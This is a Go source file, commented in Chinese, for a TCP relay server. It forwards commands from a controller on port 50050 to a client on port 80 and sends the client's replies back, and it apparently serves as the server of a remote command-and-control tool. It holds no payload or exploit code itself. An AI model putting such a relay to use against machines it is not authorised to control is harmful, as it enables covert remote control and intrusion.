package main

import (
	"fmt"
	"net"
	"sync"
)

type Conn struct {
	ClientConn  *net.Conn
	ControlConn *net.Conn
	mu          sync.Mutex // 添加互斥锁
}

var C *Conn = new(Conn)

const ClientListenPort string = ":80"
const ControlListenPort string = ":50050"

// 添加一个全局互斥锁来保护Conn的访问
var connMutex sync.Mutex

func (c *Conn) ListenControl() {
	listen, err := net.Listen("tcp", ControlListenPort)
	if err != nil {
		fmt.Println("控制端口监听失败:", err)
		return
	}
	fmt.Println("控制端口监听中:", ControlListenPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("接受控制连接失败:", err)
			continue
		}
		fmt.Println("新的控制连接已建立")

		// 使用锁保护对C的修改
		connMutex.Lock()
		C.ControlConn = &conn
		connMutex.Unlock()

		// 为每个控制连接启动一个单独的处理goroutine
		go C.DoControl(&conn)
	}
}

// 修改DoControl接收连接参数，而不是使用全局变量
func (c *Conn) DoControl(controlConn *net.Conn) {
	fmt.Println("开始处理控制连接")
	for {
		var buf [10240]byte

		n, err := (*controlConn).Read(buf[:])
		if err != nil {
			fmt.Println("从控制端读取失败:", err)
			break // 退出循环，结束这个连接的处理
		}

		command := string(buf[:n])
		fmt.Println("从控制端收到:", command)

		// 获取客户端连接
		connMutex.Lock()
		clientConn := c.ClientConn
		connMutex.Unlock()

		if clientConn == nil {
			fmt.Println("客户端未连接，无法执行命令")
			// 可以向控制端发送错误消息
			(*controlConn).Write([]byte("错误: 客户端未连接"))
			continue
		}

		// 将命令转发给客户端
		_, err = (*clientConn).Write(buf[:n])
		if err != nil {
			fmt.Println("向客户端发送命令失败:", err)
			(*controlConn).Write([]byte("错误: 向客户端发送命令失败"))
		}
	}
}

func (c *Conn) ListenClient() {
	listen, err := net.Listen("tcp", ClientListenPort)
	if err != nil {
		fmt.Println("客户端端口监听失败:", err)
		return
	}
	fmt.Println("客户端端口监听中:", ClientListenPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("接受客户端连接失败:", err)
			continue
		}
		fmt.Println("新的客户端连接已建立")

		// 使用锁保护对C的修改
		connMutex.Lock()
		C.ClientConn = &conn
		connMutex.Unlock()

		// 为每个客户端连接启动一个单独的处理goroutine
		go C.DoClient(&conn)
	}
}

// 修改DoClient接收连接参数，更清晰地处理连接
func (c *Conn) DoClient(clientConn *net.Conn) {
	fmt.Println("开始处理客户端连接")
	for {
		var buf [1024 * 1024]byte

		n, err := (*clientConn).Read(buf[:])
		if err != nil {
			fmt.Println("从客户端读取失败:", err)
			break // 退出循环
		}

		// 获取控制连接
		connMutex.Lock()
		controlConn := c.ControlConn
		connMutex.Unlock()

		if controlConn == nil {
			fmt.Println("控制连接为空，无法转发客户端响应")
			continue
		}

		// 将客户端响应发送回控制端
		_, err = (*controlConn).Write(buf[:n])
		if err != nil {
			fmt.Println("向控制端发送响应失败:", err)
		}
	}
	fmt.Println("客户端连接处理结束")
}
func main() {
	fmt.Println("服务器启动...")
	go C.ListenClient()
	go C.ListenControl()

	// 阻塞主goroutine
	select {}
}
